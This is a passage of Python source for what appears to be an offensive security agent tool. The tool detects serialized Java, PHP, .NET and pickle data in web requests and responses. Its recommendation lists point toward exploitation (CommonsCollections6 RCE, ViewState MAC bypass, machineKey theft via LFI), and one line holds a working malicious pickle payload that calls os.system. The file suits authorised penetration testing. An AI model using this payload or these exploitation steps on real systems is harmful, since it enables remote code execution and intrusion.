    cookies, POST bodies, and custom headers for serialized data.

    Identifies serialization formats: Java, PHP, .NET (binary/ViewState), Python pickle.
    """

    # Common parameter names that often carry serialized data
    COMMON_DESER_PARAMS = [
        "data", "payload", "object", "session", "token", "state", "viewstate",
        "__viewstate", "__viewstategenerator", "user", "profile", "config",
        "serialized", "obj", "java_session", "remoting_format", "amo",
        "t3", "iiop", "jmx", "rmi",
    ]

    # Headers that often carry serialized data
    COMMON_DESER_HEADERS = [
        "X-Java-Serialized-Object", "X-ViewState", "X-Session-Data",
        "X-User-Data", "X-Auth-Token", "X-CSRF-Token", "Cookie",
        "X-Forwarded-For",
    ]

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="deserialize_detect",
            description=(
                "Detect deserialization vulnerabilities by analysing request parameters, "
                "cookies, POST body, and custom headers for serialized Java, PHP, .NET, "
                "and Python objects. Supports URL probing and raw value analysis."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["probe_url", "analyse_value", "analyse_request", "list_indicators"],
                        "description": "Action to perform.",
                    },
                    "url": {
                        "type": "string",
                        "description": "Target URL to probe for deserialization (for 'probe_url').",
                    },
                    "value": {
                        "type": "string",
                        "description": "A single value to analyse (for 'analyse_value').",
                    },
                    "params": {
                        "type": "object",
                        "description": "Dict of parameter names → values to analyse (for 'analyse_request').",
                    },
                    "headers": {
                        "type": "object",
                        "description": "Dict of header names → values to analyse (for 'analyse_request').",
                    },
                    "cookies": {
                        "type": "object",
                        "description": "Dict of cookie names → values to analyse (for 'analyse_request').",
                    },
                    "post_body": {
                        "type": "string",
                        "description": "Raw POST body to analyse (for 'analyse_request').",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "HTTP request timeout in seconds. Default: 10.",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "analyse_value",
        url: Optional[str] = None,
        value: Optional[str] = None,
        params: Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, Any]] = None,
        cookies: Optional[Dict[str, Any]] = None,
        post_body: Optional[str] = None,
        timeout: int = 10,
        **kwargs: Any,
    ) -> str:
        if action == "analyse_value":
            return await self._analyse_value(value)
        elif action == "probe_url":
            return await self._probe_url(url, timeout)
        elif action == "analyse_request":
            return await self._analyse_request(params, headers, cookies, post_body)
        elif action == "list_indicators":
            return await self._list_indicators()
        else:
            raise ToolExecutionError(
                f"Unknown action '{action}'.",
                recoverable=False,
            )

    async def _analyse_value(self, value: Optional[str]) -> str:
        if not value:
            raise ToolExecutionError("'value' is required for analyse_value action.", recoverable=False)
        fmt = _detect_format(value)
        recommendations = self._get_recommendations(fmt)
        result = {
            "input_preview": value[:100] + "..." if len(value) > 100 else value,
            "detected_format": fmt,
            "is_serialized": fmt != "unknown",
            "format_details": self._format_details(fmt),
            "recommendations": recommendations,
        }
        return json.dumps(result, indent=2)

    async def _probe_url(self, url: Optional[str], timeout: int) -> str:
        if not url:
            raise ToolExecutionError("'url' is required for probe_url action.", recoverable=False)

        # SSRF protection: only allow http/https schemes
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme not in ("http", "https"):
            raise ToolExecutionError(
                f"Only http/https URLs are allowed. Got scheme '{parsed.scheme}'.",
                recoverable=False,
            )

        findings: List[Dict[str, Any]] = []

        try:
            req = urllib.request.Request(url)  # nosec B310
            req.add_header("User-Agent", "Mozilla/5.0 UniVex/1.0")
            with urllib.request.urlopen(req, timeout=timeout) as resp:  # nosec B310
                response_headers = dict(resp.headers)
                body_preview = resp.read(4096).decode("utf-8", errors="replace")
        except Exception as exc:
            return json.dumps({
                "url": url,
                "error": str(exc),
                "findings": [],
            }, indent=2)

        # Check Set-Cookie headers for serialized data
        for hdr_name, hdr_val in response_headers.items():
            if hdr_name.lower() == "set-cookie":
                for part in hdr_val.split(";"):
                    kv = part.strip().split("=", 1)
                    if len(kv) == 2:
                        fmt = _detect_format(kv[1])
                        if fmt != "unknown":
                            findings.append({
                                "location": f"Set-Cookie: {kv[0]}",
                                "format": fmt,
                                "value_preview": kv[1][:60],
                            })

        # Check body for serialized data patterns
        for line in body_preview.splitlines():
            for param in self.COMMON_DESER_PARAMS:
                if param.lower() in line.lower():
                    match = re.search(r'(?:value|content|data)=["\']?([^"\'<>\s]{20,})', line, re.IGNORECASE)
                    if match:
                        fmt = _detect_format(match.group(1))
                        if fmt != "unknown":
                            findings.append({
                                "location": f"body parameter: {param}",
                                "format": fmt,
                                "value_preview": match.group(1)[:60],
                            })

        # Check for ViewState
        if "__viewstate" in body_preview.lower():
            findings.append({
                "location": "__VIEWSTATE form field",
                "format": "dotnet_viewstate",
                "value_preview": "ViewState parameter detected",
                "note": "Extract value and test MAC validation bypass",
            })

        # Check for Java deserialization endpoints
        content_type = response_headers.get("Content-Type", response_headers.get("content-type", ""))
        if any(x in content_type.lower() for x in ["x-java-serialized-object", "application/x-java"]):
            findings.append({
                "location": "Content-Type header",
                "format": "java",
                "value_preview": content_type,
            })

        result = {
            "url": url,
            "status": "probed",
            "findings_count": len(findings),
            "findings": findings,
            "common_deser_params": self.COMMON_DESER_PARAMS,
            "recommendation": (
                "Found potential deserialization endpoints. Use java_deserialize, "
                "php_deserialize, or dotnet_deserialize tools to generate payloads."
            ) if findings else "No obvious serialization detected in response. Try manual parameter analysis.",
        }
        return truncate_output(json.dumps(result, indent=2))

    async def _analyse_request(
        self,
        params: Optional[Dict[str, Any]],
        headers: Optional[Dict[str, Any]],
        cookies: Optional[Dict[str, Any]],
        post_body: Optional[str],
    ) -> str:
        findings: List[Dict[str, Any]] = []

        def _check_dict(d: Optional[Dict[str, Any]], location_prefix: str) -> None:
            if not d:
                return
            for key, val in d.items():
                if val and isinstance(val, str):
                    fmt = _detect_format(val)
                    if fmt != "unknown":
                        findings.append({
                            "location": f"{location_prefix}: {key}",
                            "format": fmt,
                            "value_preview": val[:60] + "..." if len(val) > 60 else val,
                            "recommendations": self._get_recommendations(fmt),
                        })

        _check_dict(params, "param")
        _check_dict(headers, "header")
        _check_dict(cookies, "cookie")

        if post_body:
            fmt = _detect_format(post_body)
            if fmt != "unknown":
                findings.append({
                    "location": "POST body",
                    "format": fmt,
                    "value_preview": post_body[:60] + "..." if len(post_body) > 60 else post_body,
                    "recommendations": self._get_recommendations(fmt),
                })

        result = {
            "findings_count": len(findings),
            "findings": findings,
            "vulnerable_locations": [f["location"] for f in findings],
            "formats_found": list({f["format"] for f in findings}),
        }
        return json.dumps(result, indent=2)

    async def _list_indicators(self) -> str:
        result = {
            "java": {
                "magic_bytes": "AC ED 00 05 (hex) / rO0AB (base64 prefix)",
                "common_params": ["java_serialized", "t3", "iiop", "jmx"],
                "detection_method": "Check base64 values starting with rO0AB",
            },
            "php": {
                "pattern": "a:N:{, O:N:\"ClassName\":, s:N:\"value\";",
                "common_params": ["session", "data", "user", "token"],
                "detection_method": "Match PHP serialization format regex",
            },
            "dotnet_binary": {
                "magic_bytes": "00 01 00 00 00 (NRBF header)",
                "common_params": ["__VIEWSTATE", "viewstate", "remoting_format"],
                "detection_method": "Look for base64-encoded NRBF magic bytes",
            },
            "dotnet_viewstate": {
                "prefix": "/wEy or /wEx (base64)",
                "common_params": ["__VIEWSTATE", "__VIEWSTATEGENERATOR"],
                "detection_method": "Find __VIEWSTATE form fields in ASP.NET WebForms pages",
            },
            "python_pickle": {
                "magic_bytes": "80 02/03/04/05 (protocol 2-5)",
                "common_params": ["pickle", "session", "data"],
                "detection_method": "Check for pickle protocol magic bytes",
            },
            "common_deser_parameters": self.COMMON_DESER_PARAMS,
            "common_deser_headers": self.COMMON_DESER_HEADERS,
        }
        return json.dumps(result, indent=2)

    def _format_details(self, fmt: str) -> Dict[str, str]:
        details = {
            "java": {"lang": "Java", "tool": "ysoserial", "owasp": "A08:2021"},
            "java_b64": {"lang": "Java (base64)", "tool": "ysoserial", "owasp": "A08:2021"},
            "php": {"lang": "PHP", "tool": "phpggc", "owasp": "A08:2021"},
            "dotnet_binary": {"lang": ".NET (NRBF)", "tool": "ysoserial.net", "owasp": "A08:2021"},
            "dotnet_viewstate": {"lang": ".NET (ViewState)", "tool": "ysoserial.net ViewState", "owasp": "A08:2021"},
            "python_pickle": {"lang": "Python (pickle)", "tool": "manual craft", "owasp": "A08:2021"},
            "unknown": {"lang": "unknown", "tool": "manual analysis required", "owasp": "A08:2021"},
        }
        return details.get(fmt, details["unknown"])

    def _get_recommendations(self, fmt: str) -> List[str]:
        recs: Dict[str, List[str]] = {
            "java": [
                "Use java_deserialize tool with URLDNS gadget for blind detection",
                "Escalate to CommonsCollections6 RCE if Java ≥6",
                "Try Spring gadgets if Spring Framework is present",
            ],
            "java_b64": [
                "Base64-decode and confirm Java magic bytes (AC ED 00 05)",
                "Use java_deserialize with URLDNS to confirm blind deserialization",
                "Escalate to CommonsCollections6 RCE",
            ],
            "php": [
                "Use php_deserialize with framework-specific chains",
                "Try Laravel/RCE1 if Laravel is detected",
                "Attempt PHAR deserialization via file operation functions",
            ],
            "dotnet_binary": [
                "Use dotnet_deserialize with BinaryFormatter + TypeConfuseDelegate",
                "Check if ActivitySurrogateSelector bypasses blocklist",
            ],
            "dotnet_viewstate": [
                "Check if MAC validation is disabled (directly exploitable)",
                "Search for machineKey in web.config via LFI or public repositories",
                "Use dotnet_deserialize detect_viewstate for detailed analysis",
            ],
            "python_pickle": [
                "Craft malicious pickle payload using __reduce__ method",
                "python3 -c \"import pickle,os; print(pickle.dumps(type('x', (), {'__reduce__': lambda s: (os.system, ('id',))})()))\"",
            ],
            "unknown": [
                "Value format not recognised — analyse manually",
                "Try URL-decoding, base64-decoding, or hex-decoding",
            ],
        }
        return recs.get(fmt, recs["unknown"])


# ---------------------------------------------------------------------------
# Public registry
# ---------------------------------------------------------------------------

__all__ = [
    "JavaDeserializeTool",
    "PHPDeserializeTool",
    "DotNetDeserializeTool",
    "DeserializationDetectTool",
    "_load_java_gadgets",
    "_load_php_gadgets",
    "_load_dotnet_gadgets",
    "_detect_format",
    "_is_java_serialized",
    "_is_java_serialized_b64",
    "_is_php_serialized",
    "_is_dotnet_binary",
    "_is_python_pickle",
    "JAVA_MAGIC_BYTES",
    "JAVA_MAGIC_B64_PREFIX",
    "PHP_SERIAL_PATTERN",
    "DOTNET_BINARY_MAGIC",
    "PYTHON_PICKLE_MAGIC",
    "VIEWSTATE_B64_PATTERNS",
    "_JAVA_GADGETS_PATH",
    "_PHP_GADGETS_PATH",
    "_DOTNET_GADGETS_PATH",
]
